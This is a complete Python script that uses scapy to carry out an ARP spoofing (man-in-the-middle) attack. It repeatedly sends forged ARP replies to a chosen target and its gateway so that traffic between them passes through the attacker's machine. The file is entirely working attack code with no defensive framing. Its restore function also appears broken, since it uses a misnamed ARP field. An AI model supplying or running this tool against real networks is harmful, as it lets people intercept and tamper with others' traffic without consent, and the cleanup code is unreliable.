#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import argparse
import time


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP.")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway / Router IP.")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP with the -t flag, use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify a gateway IP with the -g flag, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hw_src=src_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_args()
target_ip = options.target
gateway_ip = options.gateway

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Resetting ARP tables.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
